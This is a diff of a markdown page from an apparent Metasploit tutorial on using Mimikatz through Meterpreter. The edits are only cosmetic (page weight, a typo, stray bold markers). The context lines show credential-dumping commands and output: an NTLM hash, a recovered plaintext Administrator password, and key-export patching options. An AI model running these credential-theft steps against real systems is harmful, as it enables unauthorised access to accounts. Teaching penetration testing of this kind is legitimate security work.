@@ -2,7 +2,7 @@
 draft: false
 title: MSF Mimikatz
 linkTitle: Mimikatz
-weight: 300
+weight: 500
 translationKey: msf-mimikatz
 date: 2017-06-16T13:59:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
@@ -131,7 +131,7 @@ Description du module : Fonctions diverses n'ayant pas encore assez de corps pou
  secrets - Affiche les secrets utilisateur
 ```
 
-As you can see, the `drivers` module has `noroutemon, eventdrop, cancelator, secrets` options.
+As you can see, the `divers` module has `noroutemon, eventdrop, cancelator, secrets` options.
 
 ## Reading Hash and Password from RAM Memory
 
@@ -197,7 +197,7 @@ LM:
 NTLM : 771ee1fce7225b28f8aec4a88aea9b6a
 
 meterpreter > mimikatz_command -f sekurlsa::searchPasswords
-**[**0] **{** Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword **}**
+[0] { Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword }
 ```
 
 ## Other Modules
@@ -285,7 +285,7 @@ listCertificates - List les certificats
  listKeys - List les conteneurs de clés
 exportCertificates - Exporte les certificats
  exportKeys - Exporte les clés
- patchcng - **[**experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
+ patchcng - [experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
  patchcapi - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
 ```
 
